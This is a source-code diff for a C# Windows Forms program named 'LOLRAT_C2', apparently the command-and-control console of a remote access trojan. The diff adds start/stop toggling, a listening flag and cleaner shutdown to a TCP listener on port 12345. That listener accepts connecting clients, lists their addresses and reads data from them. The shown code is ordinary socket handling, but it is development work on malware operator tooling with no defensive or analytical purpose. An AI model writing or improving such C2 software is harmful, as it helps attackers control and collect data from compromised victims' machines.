@@ -17,22 +17,22 @@ namespace LOLRAT_C2
         Thread listenThread;
         TcpClient client;
         NetworkStream stream;
+        bool isListening = false; // Added a flag to track whether the listener is active or not.
 
         public Form1()
         {
             InitializeComponent();
-            listenThread = new Thread(new ThreadStart(ListenForClients));
-            listenThread.Start();
         }
 
-        private void ListenForClients()
+        private void StartListening()
         {
             try
             {
                 server = new TcpListener(IPAddress.Any, 12345);
                 server.Start();
+                isListening = true;
 
-                while (true)
+                while (isListening)
                 {
                     client = server.AcceptTcpClient();
                     Invoke(new Action(() => listBoxClients.Items.Add(client.Client.RemoteEndPoint.ToString())));
@@ -49,11 +49,29 @@ namespace LOLRAT_C2
             }
         }
 
+        private void ListenForClients()
+        {
+            if (!isListening)
+            {
+                listenThread = new Thread(new ThreadStart(StartListening));
+                listenThread.Start();
+            }
+        }
+
+        private void StopListening()
+        {
+            isListening = false;
+            if (server != null)
+            {
+                server.Stop();
+            }
+        }
+
         private void ReceiveData()
         {
             try
             {
-                while (true)
+                while (isListening)
                 {
                     byte[] data = new byte[256];
                     int bytesRead = stream.Read(data, 0, data.Length);
@@ -66,8 +84,25 @@ namespace LOLRAT_C2
             }
             catch (IOException e)
             {
-                MessageBox.Show("IOException: " + e);
-                client.Close();
+                if (isListening)
+                {
+                    MessageBox.Show("IOException: " + e);
+                    client.Close();
+                }
+            }
+        }
+
+        private void btnListen_Click(object sender, EventArgs e)
+        {
+            if (!isListening)
+            {
+                ListenForClients();
+                btnListen.Text = "Stop Listening";
+            }
+            else
+            {
+                StopListening();
+                btnListen.Text = "Start Listening";
             }
         }
 
@@ -90,10 +125,7 @@ namespace LOLRAT_C2
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
             base.OnFormClosing(e);
-            if (server != null)
-            {
-                server.Stop();
-            }
+            StopListening();
             Environment.Exit(0);
         }
     }
